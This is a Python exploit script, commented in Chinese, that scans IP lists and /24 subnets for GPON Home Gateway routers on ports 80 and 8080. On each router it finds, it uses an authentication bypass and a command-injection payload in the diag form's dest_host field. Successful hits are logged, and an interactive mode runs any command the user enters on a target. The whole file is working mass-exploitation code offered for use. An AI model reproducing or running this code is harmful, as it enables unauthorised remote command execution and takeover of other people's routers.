#!/usr/bin/env python
#-*- coding:utf-8 -*-

import sys
import re
import requests
import datetime
import argparse
import threading
from socket import *


#检测端口是否开
def socket_request(file:str) -> str:
	port_list = ['80','8080']
	#遍历ip和端口
	with open(file,'r') as read_ip:
		for ip in read_ip:
			for port in port_list:
				target_ip = ip.strip()
				target_port = int(port)
				#socket请求
				try:
					timeout = 2
					setdefaulttimeout(timeout)
					s = socket(AF_INET,SOCK_STREAM)
					s.connect((target_ip,target_port))
					s.close()
					info = 'http://{}:{}'.format(target_ip,target_port)
					yield info
				except:
					pass

#请求网页中有GPON关键字,并写入到当前日期文件;
def request_web(target:str) ->str:
	try:
		res = requests.get(target,timeout=2)
		html = res.text
		if 'GPON Home Gateway' in html:
			create_file_name = datetime.datetime.now().strftime('%Y-%m-%d')
			with open(create_file_name, 'a') as hand:
				hand.writelines(target + '\n')
			yield target
			print(target)
	except:
		print("{} ---> There is no".format(target))


#漏洞利用,只反回利用成功的;
def send_payload(target:list) ->list:
	successful = []
	url_bypass = target + '/GponForm/diag_Form?images/'
	url_bypass1 = target + '/diag.html?images/'
	payload = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`id`;id&ipv=0"
	headers = {
		'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8'
	}
	try:
		res = requests.post(url_bypass,data=payload,headers=headers)
		s = requests.session()
		etrieve_results = requests.get(url_bypass1,headers=headers)
		if 'diag_result = \"Can\'t resolv hostname for [uid' in etrieve_results.text:
			successful.append(target)
			with open('successful.txt','a') as fd:
				fd.writelines(successful)
			print(successful)
	except:
		pass


#指定执行命令反回;
def send_command(target:str,command:str) ->str:
	print("[*] Injecting command..")
	url_bypass = target + '/GponForm/diag_Form?images/'
	url_bypass1 = target + '/diag.html?images/'
	payload = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`{command}`;{command}&ipv=0".format(command=command)
	headers = {
		'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8'
	}
	try:
		res = requests.post(url_bypass,data=payload,headers=headers)
		s = requests.session()
		etrieve_results = requests.get(url_bypass1,headers=headers)
		start = "["
		end = ";{}]".format(command)
		line = etrieve_results.text
		str_res = str(line[line.find(start) + len(start):line.rfind(end)])
		return str_res.replace('\\n','\n')
	except:
		pass

def C_Period(target:str) -> str:
	ip_prefix = '.'.join(target.split('.')[:-1])
	for i in range(1,256):
		port_list = ['80', '8080']
		for port in port_list:
			ip = 'http://{}.{}:{}'.format(ip_prefix,i,port)
			for x in request_web(ip):
				print(x)
				send_payload(x)




def main():
	print("""
python {name} -u http://target   测试单个网站
python {name} -file target.txt   批量测试文本中的目标
python {name} -c 192.168.1.1     C段扫描测试
		""".format(name=sys.argv[0]))
	parser = argparse.ArgumentParser(description="GPON Home Gateway Login Scan Script.")
	parser.add_argument('-u', '--url', help='Enter the target site', nargs='?')
	parser.add_argument('-f', '--file', help='The batch file', nargs='?')
	parser.add_argument('-c', '--host',help='Scan period of C',nargs='?')
	args = parser.parse_args()
	weburl = args.url
	file = args.file
	chost = args.host
	if weburl:
		command = str(input("Enter the command to be executed>>"))
		send_command(weburl, command)
	elif file:
		for x in socket_request(file):
			for i in request_web(x):
				send_payload(i)
	elif chost:
		C_Period(chost)


if __name__ == '__main__':
	t = threading.Thread(target=main)
	t.start()